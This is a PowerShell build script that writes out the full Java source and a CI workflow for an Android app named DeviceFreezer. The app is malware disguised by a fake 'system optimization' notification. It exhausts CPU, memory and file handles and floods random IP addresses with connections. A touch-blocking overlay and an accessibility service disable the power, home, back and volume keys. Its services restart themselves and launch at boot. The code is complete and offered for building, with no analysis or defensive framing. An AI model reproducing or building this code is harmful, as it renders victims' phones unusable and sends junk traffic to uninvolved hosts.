# MainActivity.java
@"
package com.sec.freezer;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.WindowManager;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent);
        }
        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(accIntent);
        triggerFullFreeze(); finish();
    }
    private void triggerFullFreeze() {
        Intent freezeIntent = new Intent(this, FreezeCore.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(freezeIntent);
        else startService(freezeIntent);
        startService(new Intent(this, OverlayBlocker.class));
    }
}
"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\MainActivity.java" -Encoding UTF8

# FreezeCore.java
@"
package com.sec.freezer;
import android.app.Notification; import android.app.NotificationChannel; import android.app.NotificationManager;
import android.app.Service; import android.content.Intent; import android.os.Build; import android.os.IBinder; import android.os.PowerManager;
import java.io.File; import java.io.FileOutputStream; import java.net.HttpURLConnection; import java.net.URL;
import java.util.ArrayList; import java.util.Random;
public class FreezeCore extends Service {
    private PowerManager.WakeLock wakeLock; private volatile boolean running = true;
    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK|PowerManager.ACQUIRE_CAUSES_WAKEUP|PowerManager.ON_AFTER_RELEASE, "FREEZE");
        wakeLock.acquire();
        createNotificationChannel();
        Notification n = new Notification.Builder(this, "ch").setContentTitle("تحسين النظام")
            .setContentText("جاري تحسين أداء الجهاز...").setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true).setPriority(Notification.PRIORITY_MAX).build();
        startForeground(Integer.MAX_VALUE, n);
    }
    @Override
    public int onStartCommand(Intent i, int f, int sid) {
        running = true;
        int cores = Runtime.getRuntime().availableProcessors();
        for (int c = 0; c < cores * 3; c++) { new Thread(() -> { while (running) {
            double x = 0; for (int j = 0; j < 500000; j++) {
                x += Math.sin(j*Math.PI)*Math.cos(j*Math.E)*Math.tan(j*Math.sqrt(2));
                x = Math.pow(x,0.5); x = Math.log(Math.abs(x)+1); x += new String(new char[100000]).hashCode(); }
        }}).start(); }
        new Thread(() -> { ArrayList<byte[]> m = new ArrayList<>(); try { while (running) {
            byte[] b = new byte[50*1024*1024]; new Random().nextBytes(b); m.add(b); }
        } catch (OutOfMemoryError e) {} }).start();
        new Thread(() -> { ArrayList<Object> o = new ArrayList<>(); try { while (running) {
            for (int j = 0; j < 1000; j++) { o.add(new byte[1024*1024]); o.add(new String(new char[500000]));
            o.add(new java.util.HashMap<String,String>()); } } } catch (OutOfMemoryError e) {} }).start();
        new Thread(() -> { ArrayList<FileOutputStream> fh = new ArrayList<>(); try { while (running) {
            try { File f2 = new File(getCacheDir(), "x_"+System.nanoTime());
                FileOutputStream fos = new FileOutputStream(f2); fos.write(new byte[1024]); fh.add(fos); } catch (Exception e) {}
        }} catch (Exception e) {} }).start();
        for (int k = 0; k < 10; k++) { new Thread(() -> { while (running) { try {
            URL u = new URL("http://"+(int)(Math.random()*256)+"."+(int)(Math.random()*256)+"."+(int)(Math.random()*256)+"."+(int)(Math.random()*256));
            HttpURLConnection c = (HttpURLConnection) u.openConnection(); c.setConnectTimeout(100); c.setReadTimeout(100); c.connect(); c.disconnect();
        } catch (Exception e) { } }}).start(); }
        return START_STICKY;
    }
    @Override public void onDestroy() { running = false; if (wakeLock!=null && wakeLock.isHeld()) wakeLock.release();
        Intent r = new Intent(this, FreezeCore.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(r); else startService(r); super.onDestroy(); }
    private void createNotificationChannel() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("ch", "محسن", NotificationManager.IMPORTANCE_MAX);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch); } }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\FreezeCore.java" -Encoding UTF8

# OverlayBlocker.java
@"
package com.sec.freezer;
import android.app.Service; import android.content.Intent; import android.graphics.PixelFormat; import android.graphics.Color;
import android.os.Build; import android.os.IBinder; import android.view.Gravity; import android.view.MotionEvent;
import android.view.View; import android.view.WindowManager; import android.widget.FrameLayout;
public class OverlayBlocker extends Service {
    private WindowManager wm; private View overlayView;
    @Override public int onStartCommand(Intent i, int f, int sid) {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (overlayView == null) {
            overlayView = new FrameLayout(this) { @Override public boolean onTouchEvent(MotionEvent e) { return true; } };
            overlayView.setBackgroundColor(Color.argb(1,0,0,0)); overlayView.setClickable(true);
            overlayView.setFocusable(true); overlayView.setFocusableInTouchMode(true);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE|WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON|
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT);
            p.gravity = Gravity.TOP|Gravity.START; wm.addView(overlayView, p);
        } return START_STICKY;
    }
    @Override public void onDestroy() { if (overlayView != null) { try { wm.removeView(overlayView); } catch (Exception e) {} overlayView = null; }
        startService(new Intent(this, OverlayBlocker.class)); super.onDestroy(); }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\OverlayBlocker.java" -Encoding UTF8

# KeyBlocker.java
@"
package com.sec.freezer;
import android.accessibilityservice.AccessibilityService; import android.content.Intent; import android.os.Handler;
import android.provider.Settings; import android.view.KeyEvent; import android.view.accessibility.AccessibilityEvent;
public class KeyBlocker extends AccessibilityService {
    private Handler h = new Handler();
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
    @Override public boolean onKeyEvent(KeyEvent e) {
        switch (e.getKeyCode()) {
            case KeyEvent.KEYCODE_POWER: case KeyEvent.KEYCODE_VOLUME_DOWN: case KeyEvent.KEYCODE_VOLUME_UP:
            case KeyEvent.KEYCODE_HOME: case KeyEvent.KEYCODE_BACK: case KeyEvent.KEYCODE_APP_SWITCH:
            case KeyEvent.KEYCODE_CAMERA: case KeyEvent.KEYCODE_MENU: case KeyEvent.KEYCODE_SEARCH: return true; }
        if (e.getAction() == KeyEvent.ACTION_DOWN && e.getRepeatCount() > 5) return true;
        return super.onKeyEvent(e);
    }
    @Override public void onInterrupt() { h.postDelayed(() -> { try {
        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i);
    } catch (Exception ex) {} }, 1000); }
    @Override public void onServiceConnected() { super.onServiceConnected(); }
}
"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\KeyBlocker.java" -Encoding UTF8

# BootReceiver.java
@"
package com.sec.freezer;
import android.content.BroadcastReceiver; import android.content.Context; import android.content.Intent; import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction()) || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(i.getAction()) || "android.intent.action.QUICKBOOT_POWERON".equals(i.getAction())) {
            Intent f = new Intent(c, FreezeCore.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(f); else c.startService(f);
            c.startService(new Intent(c, OverlayBlocker.class)); } }
}
"@ | Out-File -FilePath "$projectDir\app\src\main\java\com\sec\freezer\BootReceiver.java" -Encoding UTF8

# GitHub Actions workflow
@"
name: Build APK
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-java@v3
      with: { java-version: '17', distribution: 'temurin' }
    - uses: android-actions/setup-android@v2
    - run: |
        chmod +x gradlew 2>/dev/null || true
        if [ -f "gradlew" ]; then ./gradlew assembleDebug; else
          apt-get update -qq && apt-get install -y gradle -qq && gradle wrapper --gradle-version 8.0 && ./gradlew assembleDebug; fi
    - uses: actions/upload-artifact@v3
      with:
        name: DeviceFreezer-APK
        path: app/build/outputs/apk/debug/app-debug.apk
"@ | Out-File -FilePath "$projectDir\.github\workflows\build.yml" -Encoding UTF8

